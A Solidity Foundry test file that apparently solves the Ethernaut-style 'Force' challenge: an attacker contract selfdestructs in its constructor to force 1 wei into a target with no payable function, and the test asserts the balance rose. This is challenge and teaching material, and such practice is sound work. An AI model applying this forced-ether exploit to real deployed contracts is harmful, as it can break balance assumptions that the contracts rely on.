// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {Force} from "../src/Force.sol";

// The attacker contract that forces ETH into the target via selfdestruct
contract ForceAttacker {
    constructor(address payable _target) payable {
        selfdestruct(_target);
    }
}

contract ForceTest is Test {
    Force public force;

    function setUp() public {
        // 1. Deploy the target Force contract
        force = new Force();
    }

    function testForceBreak() public {
        // Fund your test contract
        vm.deal(address(this), 1 ether);

        // Deploy the attacker and send 1 wei
        new ForceAttacker{value: 1 wei}(payable(address(force)));

        // Assert balance
        assertGt(address(force).balance, 0);
    }
}
